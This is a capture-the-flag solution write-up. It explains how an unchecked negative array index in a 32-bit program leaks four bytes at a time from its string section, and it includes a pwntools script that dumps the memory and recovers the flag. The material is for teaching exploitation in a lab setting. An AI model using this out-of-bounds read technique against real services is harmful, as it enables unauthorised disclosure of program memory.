## Lecture Pick (Medium) - Solution

The variable `courses` holds a list of string pointers. We know that strings
are readonly arrays of chars. All strings are located in the `.text` segment of
the program. As the flag is also a string constant in the program it is also
located somewhere in this section.
The program prints the addresses of `courses` which is on the stack, as well as
the addresses of all course strings which are in `.text`.
Afterwards the result of the `courses[x]` expression is printed as a 4 byte hex
number (using the `%p` formatting on 32 bit machines).
Given the adress of `courses` as e.g. `0xffa2dd0c` and `x` as `3` the
expression `courses[x]` effectively loads 4 bytes from the address
`courses + 4 * x` which is `0xffa2dd0c + 4 * 3`.
Given the address of the String `"Maths 1"` as e.g. `0x56591032` we can
calculate an `x` in order to read four bytes from the text segment:
`(0x56591032 - 0xffa2dd0c) / 4 = -710046518,5`. Entering `-710046518` for x we
should be able to read bytes 2-6 of the `"Maths 1"` string, which should be
`ths `. The program outputs `0x20736874`, which we can convert to a string by
changing the byte order (little endian read from linear array) and then
interpreting each byte as a hex encoded ascii character:
- 0x74 -> 116 -> t
- 0x68 -> 104 -> h
- 0x73 -> 115 -> s
- 0x20 -> 32 -> space

As we can see with each run of the program we can dump 4 bytes from the `.text`
segment of the program. Using this technique we can search for the flag and
dump it.

While this could be achieved manually, the following shows a python program
which performs this task automatically. Running the program results in:
```
????????????????????????????????????????????????????????nflag{c4lcul4t1ng-th3-0ffs3ts-l1k3-a-pro}.Maths 1.Maths 2.Object Oriented Programming.Computer Vision.IT-Security.Forens????Software Engineering.Theoretical Computer Science.Courses [%????.  - [%p] %s..Pick one: .%ld.You picked ????...;????????
```
which is a dump of most of the strings from the `.text` section. As we can see
it includes the flag `nflag{c4lcul4t1ng-th3-0ffs3ts-l1k3-a-pro}`

```python3
from pwn import *
from binascii import unhexlify

result = ""
for offset in range(-100, 200, 4):
    try:
        p = remote("localhost", 4000) # replace with your target
        p.readuntil("Courses [0x")
        courses = int(p.read(8), 16)
        p.readuntil("  - [0x")
        math1 = int(p.read(8), 16)

        p.readuntil("Pick one:")
        x = int((math1 - courses + offset) / 4)

        p.sendline(str(x).encode("utf8"))
        p.readuntil("You picked 0x")
        data = unhexlify(p.read(8))

        p.close()

        for c in data[::-1]:
            c = chr(c)
            if c.isprintable():
                result += c
            else:
                result += "."
    except:
        print("Error reading offset {}, filling with ?".format(offset))
        result += "????"

    if offset % 10 == 0:
        print("reading offset {}/120".format(offset))

print(result)
```
